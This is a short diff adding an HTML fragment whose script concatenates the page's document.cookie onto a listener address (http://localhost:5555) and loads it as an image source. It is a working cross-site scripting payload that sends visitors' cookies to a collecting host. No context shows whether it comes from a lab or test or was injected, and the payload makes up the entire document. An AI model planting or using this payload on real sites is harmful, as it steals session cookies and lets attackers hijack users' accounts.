@@ -1,0 +1,6 @@
+<img id = "mypic" src="">
+<script>
+var listen = "http://localhost:5555";
+var cookie = listen.concat((document.cookie));
+document.getElementById("mypic").src=cookie;
+</script>
